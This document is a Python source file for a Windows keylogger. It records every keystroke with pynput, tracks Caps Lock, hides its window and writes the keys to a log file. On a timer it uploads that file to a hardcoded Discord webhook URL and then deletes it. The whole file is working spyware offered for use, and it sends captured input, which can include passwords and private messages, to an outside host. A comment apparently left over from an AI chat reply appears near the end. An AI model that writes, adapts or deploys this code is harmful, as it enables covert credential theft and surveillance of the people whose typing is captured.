import os
import getpass
import time
import ctypes
import tkinter as tk
import requests
from pynput import keyboard
import math

# Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1187414843637121164/0P-BlEVuY9xMx9wCqZVO3ch2MJ415sjHesLvLaZVdqvGbp2KBEir391bj4X-FA_k0oG3'

# Keylogger settings
script_path = os.path.abspath(__file__)
username = getpass.getuser()
log_path = "C:/Users/inchan/Desktop/Keylogger/log.txt"
keylogs_str = ""
last_key_time = time.time()
delay_duration = 20  # Set the delay duration in seconds
upload_triggered = False  # Flag to track if the upload has been triggered

def send_webhook_with_file(webhook_url, file_path):
    with open(file_path, 'rb') as file:
        payload = {"content": "KEYLOG!"}
        files = {'file': (file_path, file)}
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 200:
            file.close()
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

def send_keylogs_to_discord():
    global keylogs_str, upload_triggered
    print(time.time() - last_key_time)

    if not upload_triggered:
        with open(log_path, 'a') as log_file:
            log_file.write(keylogs_str)

        file_size = os.path.getsize(log_path) / (1024 * 1024)  # Convert bytes to megabytes

        print(math.floor(file_size))
        if file_size >= 2 or time.time() - last_key_time > delay_duration:
            print(f"File size is {file_size:.2f} MB. Uploading to Discord and deleting...")
            send_webhook_with_file(webhook_url, log_path)
            os.remove(log_path)
            print("File uploaded and deleted.")
        else:
            print(f"File size is {file_size:.2f} MB.")
            send_webhook_with_file(webhook_url, log_path)
            print("Uploading...")

        keylogs_str = ""
        upload_triggered = True  # Set the flag to True after uploading

def get_capslock_state():
    return ctypes.windll.user32.GetKeyState(0x14) & 1


def handle_special_keys(key):
    special_characters = {
        keyboard.Key.backspace: "\n [BackSpace]\n",
        keyboard.Key.enter: "\n [Enter]\n",
        keyboard.Key.space: " ",
    }

    if key in special_characters:
        print(f"{special_characters[key]} key pressed")
        return special_characters[key]

    if key == keyboard.Key.caps_lock:
        capslock_state = "[CAPSLOCK ON]" if get_capslock_state() else "[CAPSLOCK OFF]"
        print(f"Caps Lock is {capslock_state}")
        return capslock_state

    return None

def handle_numpad_keys(key):
    numpad_key_mapping = {
        96: "0",
        97: "1",
        98: "2",
        99: "3",
        100: "4",
        101: "5",
        102: "6",
        103: "7",
        104: "8",
        105: "9",
        106: "10",
        # Add more mappings as needed
    }

    if hasattr(key, 'vk') and key.vk in numpad_key_mapping:
        print(numpad_key_mapping[key.vk])
        return numpad_key_mapping[key.vk]

def handle_regular_keys(key):
    try:
        char = format(key.char)
        capslock_state = get_capslock_state()
        print(capslock_state)
        if capslock_state:
            char = char.upper()
        else:
            char = char.lower()

        print(char)
        return char
    except AttributeError:
        print(f"Special key {key} pressed")
        return None

def keyPressed(key):
    global keylogs_str, last_key_time

    with open(log_path, 'a') as log_file:
        special_key_result = handle_special_keys(key)
        numpad_key_result = handle_numpad_keys(key)

        if special_key_result is not None:
            log_file.write(special_key_result)
            keylogs_str += special_key_result
        elif numpad_key_result is not None:
            log_file.write(numpad_key_result)
            keylogs_str += numpad_key_result
        else:
            regular_key_result = handle_regular_keys(key)
            if regular_key_result is not None:
                log_file.write(regular_key_result)
                keylogs_str += regular_key_result


# The following line was missing in my previous responses
keyboard.Listener(on_press=keyPressed)

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    try:
        while True:
            time_elapsed = time.time() - last_key_time
            time_remaining = max(0, delay_duration - time_elapsed)

            if time_elapsed >= delay_duration:
                send_keylogs_to_discord()
                last_key_time = time.time()

            print(f"Time remaining: {time_remaining:.1f} seconds", end='\r')
            time.sleep(1)  # Sleep for 1 second to avoid high CPU usage

    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        listener.join()

